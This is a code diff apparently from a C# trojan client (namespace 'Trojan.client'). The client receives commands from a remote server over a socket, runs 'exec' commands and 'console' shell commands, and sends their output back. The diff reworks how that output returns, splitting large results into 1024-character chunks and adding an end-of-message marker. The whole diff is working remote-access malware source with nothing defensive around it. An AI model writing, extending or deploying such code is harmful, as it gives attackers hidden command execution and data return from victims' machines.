@@ -51,21 +51,6 @@ namespace Trojan.client
             await sock.SendAsync(Encoding.UTF8.GetBytes(message), SocketFlags.None);
         }
 
-        /*
-        public async Task Send_Socket(Socket sock, StringBuilder message, int SendTimeout)
-        {
-            if (sock == null) throw new ExceptionHandler("[-] Socket can not be null : " + nameof(sock));
-
-            StringBuilder Packetized = new StringBuilder();
-            if (message.Length > BUFFSIZE)
-            {
-                Packetized.AppendLine();
-            }
-
-            await sock.SendAsync(Encoding.UTF8.GetBytes(message), SocketFlags.None);
-        }
-        */
-
         public async Task Receive_Socket(socketSetup socketSetup, int ReceiveTimeout)
         {
             if (socketSetup.sock == null) throw new ExceptionHandler("[-] Socket can not be null : " + nameof(socketSetup.sock));
@@ -82,7 +67,7 @@ namespace Trojan.client
                     Console.WriteLine("\n[+] [{0}] Received_MessageFromServer[{1}] -- Message_Length[{2} characters] ;", socketSetup.getUUID(), message, message.Length);
                     socketSetup.buffer = tmpBuffer;
 
-                    if (TruncationCheckCommand(message, 0, 7) != "console")
+                    if (TruncationCheckCommand(message, 0, 4) == "exec")
                     {
                         string command_parsed = CommandExtension.CheckForCommand(message);
                         if (command_parsed != "")
@@ -94,8 +79,10 @@ namespace Trojan.client
                         {
                             await Send_Socket(socketSetup.sock, "\t[|] Command failed " + "[" + message + "]" + " [" + socketSetup.getUUID() + "]", SEND_TIMEOUT);
                         }
+
+                        await Send_Socket(socketSetup.sock, "<EODM>", SEND_TIMEOUT);
                     }
-                    else
+                    else if (TruncationCheckCommand(message, 0, 7) == "console")
                     {
                         string TCPShell_Command = message.Substring(7);
 
@@ -114,7 +101,34 @@ namespace Trojan.client
                             OutputData.AppendLine("\t" + line);
                         }
 
-                        await Send_Socket(socketSetup.sock, OutputData.ToString(), SEND_TIMEOUT);
+                        if (OutputData.Length > BUFFSIZE)
+                        {
+                            StringBuilder split_OutputData = new StringBuilder((int)(BUFFSIZE));
+
+                            int offset = 0;
+                            int dataLeft = 0;
+                            int charsRead = 1024;
+                            while (offset < OutputData.Length)
+                            {
+                                split_OutputData.Clear();
+                                dataLeft = OutputData.Length - offset;
+
+                                if (dataLeft < 1024)
+                                    charsRead = dataLeft;
+
+                                split_OutputData.Append(StringExtensions.PartitionAsString(OutputData.ToString().Substring(offset, charsRead), charsRead));
+
+                                offset += charsRead;
+
+                                await Send_Socket(socketSetup.sock, split_OutputData.ToString(), SEND_TIMEOUT);
+                            }
+                        }
+                        else
+                        {
+                            await Send_Socket(socketSetup.sock, OutputData.ToString(), SEND_TIMEOUT);
+                        }
+
+                        await Send_Socket(socketSetup.sock, "<EODM>", SEND_TIMEOUT);
                     }
 
                     if (ReceiveTimeout == Timeout.Infinite) { await Receive_Socket(socketSetup, ReceiveTimeout); }
